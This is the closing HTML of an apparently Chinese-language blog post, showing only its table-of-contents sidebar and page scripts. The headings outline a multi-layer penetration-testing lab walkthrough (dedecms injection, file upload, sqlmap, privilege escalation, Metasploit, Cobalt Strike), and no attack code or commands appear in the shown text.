href="#Web%E6%9C%8D%E5%8A%A1%E6%80%BB%E7%BB%93"><span class="nav-number">2.3.</span> <span class="nav-text">Web服务总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cc123-com"><span class="nav-number">2.3.1.</span> <span class="nav-text">cc123.com</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#www-cc123-com"><span class="nav-number">2.3.2.</span> <span class="nav-text">www.cc123.com</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ww2-cc123-com"><span class="nav-number">2.3.3.</span> <span class="nav-text">ww2.cc123.com</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#new-cc123-com"><span class="nav-number">2.3.4.</span> <span class="nav-text">new.cc123.com</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#192-168-2-11-80"><span class="nav-number">2.3.5.</span> <span class="nav-text">192.168.2.11:80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#192-168-2-11-999"><span class="nav-number">2.3.6.</span> <span class="nav-text">192.168.2.11:999</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#192-168-2-11-6588"><span class="nav-number">2.3.7.</span> <span class="nav-text">192.168.2.11:6588</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.4.</span> <span class="nav-text">目录遍历</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dedecms"><span class="nav-number">2.5.1.</span> <span class="nav-text">dedecms</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">2.5.1.1.</span> <span class="nav-text">查看版本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dede-20150618%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.1.2.</span> <span class="nav-text">dede 20150618前台注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.5.1.3.</span> <span class="nav-text">后台文件上传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Grcms-%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8F%A3"><span class="nav-number">2.5.2.</span> <span class="nav-text">Grcms 后台登录口</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">sqlmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95"><span class="nav-number">2.5.2.2.</span> <span class="nav-text">手工测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.5.2.3.</span> <span class="nav-text">文件上传</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.6.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">2.7.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobalt-strike"><span class="nav-number">2.8.</span> <span class="nav-text">Cobalt strike</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">第二层：数据库服务器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9A%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">第三层：目标机器</span></a></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>





<div class="post-scripts">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>



</body>
</html>
